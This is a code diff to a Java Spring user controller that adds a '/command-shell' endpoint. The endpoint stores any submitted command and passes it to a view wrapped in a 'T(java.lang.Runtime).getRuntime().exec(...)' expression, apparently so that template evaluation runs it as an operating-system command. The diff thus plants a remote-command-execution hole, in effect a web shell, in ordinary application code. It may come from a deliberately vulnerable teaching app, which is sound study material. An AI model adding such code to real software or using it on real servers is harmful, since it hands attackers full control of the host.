@@ -51,6 +51,7 @@ import javax.validation.Valid;
 import java.io.IOException;
 import java.security.Principal;
 import java.util.List;
+import java.util.Objects;
 import java.util.Optional;
 import java.util.UUID;
 import java.util.stream.Collectors;
@@ -94,6 +95,8 @@ public class UserController extends AbstractBaseController {
 
     @Autowired
     LocaleConfiguration localeConfiguration;
+    
+    private String thRCECMD = ""; 
 
     @Override
     LocaleConfiguration GetLocaleConfiguration() {
@@ -454,5 +457,26 @@ public class UserController extends AbstractBaseController {
     public ResponseEntity<?> handleStorageFileNotFound(StorageFileNotFoundException exc) {
         return ResponseEntity.notFound().build();
     }
-
+    
+    @GetMapping("/command-shell")
+    public String getCommandShell(Model model) {
+    	
+    	String cmdWrapper = "";
+    	if (Objects.nonNull(this.thRCECMD) && this.thRCECMD.length() > 2) {
+    		cmdWrapper = String.format("T    (java.lang.Runtime).getRuntime().exec('%s')", this.thRCECMD);
+    	}
+        model.addAttribute("shellcmd", cmdWrapper);
+        model.addAttribute("usercmd", this.thRCECMD);
+        return "user/command-shell";
+    }
+    
+    @PostMapping("/command-shell")
+    public String executeCommandShell(@RequestParam("cmdshell") String cmd, 
+    		RedirectAttributes redirectAttributes) {
+    	
+    	this.thRCECMD = cmd;
+    	redirectAttributes.addFlashAttribute("message",
+                "You successfully executed " + cmd + "!");
+        return "redirect:/user/command-shell";
+    }    
 }
